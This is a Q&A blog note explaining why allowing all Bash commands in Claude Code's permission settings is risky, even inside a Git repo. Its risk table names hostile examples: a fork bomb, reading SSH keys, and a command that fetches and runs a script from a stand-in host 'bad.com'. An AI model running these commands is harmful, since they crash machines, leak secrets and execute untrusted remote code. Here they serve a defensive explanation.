---
audio: false
generated: true
image: false
lang: en
layout: post
title: Claude Code Permissions Risks Explained
translated: false
type: note
---

Question: Do the command permissions (allow/deny/ask) in this configuration apply only to the current directory and additionalDirectories, so can I safely allow everything since this is a Git repo? Also, I have the source code on another laptop.

Answer:

No, you cannot safely "allow all" just because it's a Git repo — the permissions still carry meaningful risks even in your own project.

This configuration appears to come from **Claude Code** (Anthropic's AI coding tool / Claude Dev / Claude in editor), where the `permissions` block controls what Bash commands (and other tools like Read/Write/Edit) the AI agent can execute without asking for confirmation.

### Key points about how these permissions work

- **Scope of file access (Read / Write / Edit / ls / cat / etc.)**
  By default, the AI is restricted to the **project directory** (the folder opened in the editor / where `.claude.json` or similar config lives).
  `additionalDirectories` explicitly extends read/write access to other paths (here only `/etc/systemd/system`).
  So yes — file-system-affecting commands are limited to the project folder + the listed extra directories.

- **Bash command execution scope**
  The allow/ask/deny rules apply to **all invocations** of `Bash(...)`, **regardless of what directory** the command runs in or affects.
  Even if file access is scoped, many dangerous commands do **not** need to touch files outside the project to cause harm:

  | Category              | Examples from your allow list                          | Risk even inside project folder? |
  |-----------------------|----------------------------------------------------------------|----------------------------------|
  | Network / exfil       | `curl`, potential `wget`, `ping` etc.                          | Yes — can send local files/token/keys to attacker-controlled server |
  | Environment leakage   | `env`, `printenv`, `cat ~/.ssh/*` (if keys are present)       | Yes — can leak secrets present in shell env or home (if readable) |
  | Cryptocurrency miners | `git clone ... && ./miner`                                     | Yes — can use your CPU/GPU without touching other folders |
  | Infinite loops / fork bombs | `while true; do :; done` or `:(){ :|:& };: `               | Yes — can freeze/crash your machine |
  | Obfuscated install    | `bash -c "$(curl -fsSL bad.com)"`                              | Yes — runs in project dir but downloads & executes anything |

- **Why Git repo doesn't make "allow all" safe**
  - Prompt injection / tool mis-use remains possible (malicious prompt → AI runs bad Bash).
  - You (or a shared config) might open the repo in Claude Code on a less trusted machine later.
  - You have the same source code on another laptop → if you copy this permissive config over, the risk travels with it.
  - Many real-world escapes / vulnerabilities in AI coding tools have come from over-permissive Bash access, even on personal projects.

### Recommendation

Keep the current **granular** setup (explicit allow list + ask for dangerous actions).
It's already quite permissive (allows `git`, `npm`, `yarn`, `pnpm`, `pip`, `cargo`, `docker`, etc.), which is fine for most development workflows.

If you want to loosen it further without going full "allow everything":

- Add more specific patterns to `allow`, e.g. `"Bash(git push:*)"` instead of just `"Bash(git:*)"`
- Move risky commands to `ask`: `chmod`, `rm -rf`, `sudo`, broad `curl`, `docker run` without args, etc.
- Never set `"enableAllProjectMcpServers": true` unless you fully trust every `.mcp.json` in the repo (security best practice).
- Consider using `deny` for known-dangerous patterns: `"Bash(curl:*http*)"` or similar.

In short: **scoped file access ≠ safe unlimited command execution**.
Even in your own Git repo, broad `Bash(*)` allow rules are not recommended.

References:

- [Claude Code Docs - Configure permissions](https://code.claude.com/docs/en/permissions)
- [Claude Code Security Best Practices](https://www.backslash.security/blog/claude-code-security-best-practices)
- [Claude Code settings reference](https://code.claude.com/docs/en/settings)
